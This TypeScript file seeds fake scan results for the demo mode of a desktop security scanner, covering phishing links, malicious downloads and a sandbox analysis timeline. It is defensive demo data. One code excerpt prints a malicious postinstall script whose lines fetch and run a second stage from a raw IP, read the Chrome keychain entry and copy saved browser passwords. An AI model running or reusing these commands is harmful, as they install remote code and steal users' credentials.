// Demo data for design checks and rehearsals: `AEGIS_DEMO=1 pnpm dev`.
// It lives in a separate database (userData/aegis-demo.db, rebuilt on every demo launch), the UI
// shows a "Demo data" chip, and nothing here ever reaches the real history in aegis.db.
// Content follows the Figma demo path (figma/built.md) and the screen references.

import { randomUUID } from 'crypto'
import type { CodeExcerpt, LogEntry, ScanReport, Verdict } from '@shared/types'
import type { Store } from './store'

type Row = Partial<ScanReport> &
  Pick<ScanReport, 'kind' | 'verdict' | 'action' | 'seenIn'> & {
    minutesAgo: number
    fileCategory?: string
    caughtBy?: string
  }

const LINKS: Row[] = [
  {
    kind: 'link',
    verdict: 'malicious',
    action: 'blocked',
    seenIn: 'Gmail',
    url: 'https://login-northwlnd-io.sbs/sso',
    reason: 'Brand impersonation',
    score: 94,
    minutesAgo: 6,
    durationMs: 1180
  },
  {
    kind: 'link',
    verdict: 'malicious',
    action: 'blocked',
    seenIn: 'Gmail',
    url: 'https://secure-doc-share.sbs/view',
    reason: 'Credential harvesting',
    score: 88,
    minutesAgo: 9,
    durationMs: 1420
  },
  {
    kind: 'link',
    verdict: 'suspicious',
    action: 'held',
    seenIn: 'Chrome',
    url: 'https://cdn-assets-delivery.top/pkg.js',
    reason: 'Obfuscated script',
    score: 61,
    minutesAgo: 20,
    durationMs: 2210
  },
  {
    kind: 'link',
    verdict: 'suspicious',
    action: 'held',
    seenIn: 'iMessage',
    source: 'photon',
    url: 'https://bit.ly/3xQ9f2k',
    reason: 'Shortener, unresolved',
    score: 44,
    minutesAgo: 24,
    durationMs: 960
  },
  {
    kind: 'link',
    verdict: 'unknown',
    action: 'allowed',
    seenIn: 'Chrome',
    url: 'https://partner-portal.vendorx.io',
    reason: 'Newly registered',
    score: 22,
    minutesAgo: 29,
    durationMs: 1330
  },
  {
    kind: 'link',
    verdict: 'clean',
    action: 'allowed',
    seenIn: 'Chrome',
    url: 'https://docs.vendor.com/api/auth',
    reason: 'Known good',
    score: 2,
    minutesAgo: 56,
    durationMs: 140
  },
  {
    kind: 'link',
    verdict: 'clean',
    action: 'allowed',
    seenIn: 'Chrome',
    url: 'https://github.com/northwind/aegis',
    reason: 'Known good',
    score: 1,
    minutesAgo: 70,
    durationMs: 120
  }
]

const INVOICE_CODE: CodeExcerpt = {
  path: 'postinstall.sh',
  origin: 'extracted in the sandbox',
  startLine: 8,
  lines: [
    '#!/bin/sh',
    'PLIST="$HOME/Library/LaunchAgents/com.apple.updater.plist"',
    'cp "$0/../bin/.updater" "$HOME/.updater" && chmod +x "$HOME/.updater"',
    'curl -s http://185.220.101.44/s2 -o /tmp/.s2 && sh /tmp/.s2',
    'security find-generic-password -ga "Chrome" 2>&1',
    'cp "$HOME/Library/Application Support/Google/Chrome/Default/Login Data" /tmp/.ld',
    'exit 0'
  ],
  flags: [
    { line: 9, title: 'Persists at login', severity: 'critical' },
    { line: 11, title: 'Downloads and runs a second stage', severity: 'critical' },
    { line: 12, title: 'Reads the login keychain', severity: 'critical' },
    { line: 13, title: 'Copies saved passwords', severity: 'critical' }
  ]
}

const FILES: Row[] = [
  {
    kind: 'download',
    verdict: 'malicious',
    action: 'quarantined',
    seenIn: 'Gmail',
    filename: 'invoice_oct.iso',
    url: 'https://mail.google.com/mail/u/0/?attid=0.1',
    fileKind: 'Disc image',
    size: 4_404_019,
    score: 94,
    reason: 'Disc image hiding a Mach-O binary',
    minutesAgo: 10,
    durationMs: 41_000,
    fileCategory: 'Archive',
    caughtBy: 'Sandbox analysis',
    summary:
      'This file would have installed itself and sent your Chrome passwords to a server in Moldova.',
    stage1: {
      file: {
        name: 'invoice_oct.iso',
        realType: 'Mach-O 64-bit',
        sha256: '9c1f5e0b7a2d4c88e1f03b6a9d27c45e8f10b3a6c7d2e9f4a1b0c8d7e6f504ab',
        size: 4_404_019
      },
      findings: [
        {
          severity: 'critical',
          title: 'Disc image hiding a Mach-O binary',
          detail: 'The .iso holds an executable named like a PDF.'
        },
        { severity: 'high', title: 'Unsigned', detail: 'No Developer ID signature.' },
        {
          severity: 'critical',
          title: 'Persists at login',
          detail: 'postinstall.sh writes a LaunchAgent.'
        },
        {
          severity: 'critical',
          title: 'Reads keychain',
          detail: 'Calls security find-generic-password.'
        },
        {
          severity: 'high',
          title: 'Contacts 2 unknown hosts',
          detail: '185.220.101.44, api-telemetry.sbs'
        }
      ],
      iocs: ['185.220.101.44', 'api-telemetry.sbs'],
      capabilities: [
        'persists at login',
        'reads keychain',
        'captures keystrokes',
        'contacts C2',
        'packed section'
      ],
      score: 94,
      partial: false
    },
    droid: {
      verdict: 'malicious',
      summary:
        'This file would have installed itself and sent your Chrome passwords to a server in Moldova.',
      confidence: 'high',
      unknowns: ['What the second stage does: the server did not answer inside the sandbox.'],
      timeline: [
        {
          step: 1,
          tone: 'danger',
          title: 'Writes itself to ~/Library/LaunchAgents',
          detail: 'So it starts again every time you log in',
          evidence: [{ path: 'postinstall.sh', line: 9, code: INVOICE_CODE.lines[1] }]
        },
        {
          step: 2,
          tone: 'danger',
          title: 'Downloads a second stage from 185.220.101.44',
          detail: 'Observed in the sandbox at 13:58:44',
          evidence: [{ path: 'postinstall.sh', line: 11, code: INVOICE_CODE.lines[3] }]
        },
        {
          step: 3,
          tone: 'danger',
          title: "Reads Chrome's Login Data and the login keychain",
          detail: 'Saved passwords and session cookies',
          evidence: [{ path: 'postinstall.sh', line: 12, code: INVOICE_CODE.lines[4] }]
        },
        {
          step: 4,
          tone: 'warning',
          title: 'Sends a 2.1 MB POST to api-telemetry.sbs',
          detail: 'Over plain HTTP, after a 40-second delay',
          evidence: []
        }
      ]
    },
    indicators: {
      sha256: '9c1f5e0b7a2d4c88e1f03b6a9d27c45e8f10b3a6c7d2e9f4a1b0c8d7e6f504ab',
      realType: 'Mach-O 64-bit',
      claimedType: 'Disc image',
      signature: 'Unsigned',
      size: 4_404_019,
      firstSeen: null
    },
    code: [INVOICE_CODE],
    checks: [
      { name: 'Local pre-check', state: 'ok', result: 'passed' },
      { name: 'Daytona sandbox', state: 'ok', result: '38 s' },
      { name: 'Droid review', state: 'ok', result: 'complete' },
      { name: 'Safe Browsing', state: 'ok', result: 'no match' },
      { name: 'capa capabilities', state: 'warn', result: '5 found' },
      { name: 'Detonation', state: 'warn', result: 'timed out' }
    ],
    sandbox: [
      {
        provider: 'daytona',
        sandboxId: 'sbx-demo-7f3a',
        image: 'aegis-analyzer',
        network: 'off',
        startupMs: 2800,
        runMs: 38_000,
        ran: ['analyze.py'],
        destroyedAt: null
      }
    ]
  },
  {
    kind: 'download',
    verdict: 'malicious',
    action: 'quarantined',
    seenIn: 'Chrome',
    filename: 'setup_v2.scr',
    fileKind: 'Executable',
    size: 1_153_434,
    score: 90,
    reason: 'EICAR test signature',
    minutesAgo: 17,
    durationMs: 9_000,
    fileCategory: 'Installer',
    caughtBy: 'Static signatures'
  },
  {
    kind: 'quarantine',
    verdict: 'suspicious',
    action: 'held',
    seenIn: '~/Downloads',
    source: 'watcher',
    filename: 'Q3-summary.xlsm',
    fileKind: 'Spreadsheet',
    size: 290_816,
    score: 58,
    reason: 'Macro runs on open',
    minutesAgo: 37,
    durationMs: 14_000,
    fileCategory: 'Document',
    caughtBy: 'Macro analysis'
  },
  {
    kind: 'download',
    verdict: null,
    action: 'scanning',
    status: 'analyzing',
    seenIn: 'Chrome',
    filename: 'drivers.zip',
    fileKind: 'Archive',
    size: 19_503_513,
    score: null,
    reason: null,
    minutesAgo: 1,
    durationMs: null,
    fileCategory: 'Archive'
  },
  {
    kind: 'download',
    verdict: 'unknown',
    action: 'held',
    seenIn: 'Chrome',
    filename: 'vendor-sdk.pkg',
    fileKind: 'Installer',
    size: 44_145_049,
    score: 18,
    reason: 'Analysis timed out',
    partial: true,
    minutesAgo: 59,
    durationMs: 60_000,
    fileCategory: 'Installer'
  },
  {
    kind: 'download',
    verdict: 'clean',
    action: 'delivered',
    seenIn: 'Chrome',
    filename: 'brand-assets.zip',
    fileKind: 'Archive',
    size: 9_856_614,
    score: 4,
    reason: 'No threats found',
    minutesAgo: 73,
    durationMs: 12_000,
    fileCategory: 'Archive'
  },
  {
    kind: 'download',
    verdict: 'clean',
    action: 'delivered',
    seenIn: 'Gmail',
    filename: 'statement-sept.pdf',
    fileKind: 'PDF',
    size: 182_272,
    score: 0,
    reason: 'Checked on this Mac',
    minutesAgo: 95,
    durationMs: 300,
    fileCategory: 'Document'
  }
]

function toReport(row: Row, now: number): ScanReport {
  const at = new Date(now - row.minutesAgo * 60_000).toISOString()
  const verdict = row.verdict as Verdict | null
  return {
    id: randomUUID(),
    kind: row.kind,
    source: row.source ?? (row.seenIn === '~/Downloads' ? 'watcher' : 'chrome'),
    seenIn: row.seenIn,
    url: row.url ?? null,
    filename: row.filename ?? null,
    fileKind: row.fileKind ?? null,
    size: row.size ?? null,
    status: row.status ?? 'done',
    verdict,
    score: row.score ?? null,
    reason: row.reason ?? null,
    action: row.action,
    durationMs: row.durationMs ?? null,
    createdAt: at,
    updatedAt: at,
    summary: row.summary ?? null,
    reasons: [],
    stage1: row.stage1 ?? null,
    droid: row.droid ?? null,
    indicators: row.indicators
      ? { ...row.indicators, firstSeen: at }
      : {
          sha256: null,
          realType: null,
          claimedType: null,
          signature: null,
          size: row.size ?? null,
          firstSeen: at
        },
    code: row.code ?? [],
    checks: row.checks ?? [],
    sandbox: (row.sandbox ?? []).map((s) => ({
      ...s,
      destroyedAt: new Date(now - (row.minutesAgo - 1) * 60_000).toISOString()
    })),
    partial: row.partial ?? false,
    heldPath: null
  }
}

export function seedDemo(store: Store, now = Date.now()): void {
  for (const row of [...LINKS, ...FILES]) {
    store.putScan(toReport(row, now), {
      fileCategory: row.fileCategory ?? null,
      caughtBy: row.caughtBy ?? null
    })
  }
  store.addTrusted('vendor.com')
}

export function demoLog(now = Date.now()): LogEntry[] {
  const t = (m: number): string => new Date(now - m * 60_000).toISOString()
  return [
    {
      at: t(95),
      level: 'allow',
      text: 'file name=statement-sept.pdf verdict=clean checked=local uploaded=no'
    },
    {
      at: t(56),
      level: 'allow',
      text: 'link url=docs.vendor.com/api/auth verdict=clean cached=true'
    },
    {
      at: t(37),
      level: 'warn',
      text: 'file name=Q3-summary.xlsm source=watcher verdict=suspicious reason=macro-autoexec'
    },
    {
      at: t(20),
      level: 'warn',
      text: 'link url=cdn-assets-delivery.top/pkg.js verdict=suspicious reason=obfuscated-js'
    },
    {
      at: t(10),
      level: 'block',
      text: 'file name=invoice_oct.iso sha256=9c1f…04ab verdict=malicious engine=sandbox'
    },
    {
      at: t(6),
      level: 'block',
      text: 'link url=login-northwlnd-io.sbs/sso verdict=malicious rule=newly-registered+brand-match'
    }
  ]
}

/** What the extension would report for the open tab (MEGA_PROMPT §5.8 "This page"). */
export const DEMO_PAGE = {
  url: 'https://mail.google.com/mail/u/0/#inbox/FMfcgz',
  counts: { clean: 11, unknown: 0, suspicious: 0, malicious: 1 },
  top: {
    domain: 'login-northwlnd-io.sbs',
    reason: 'registered 2 days ago',
    verdict: 'malicious' as Verdict
  }
}
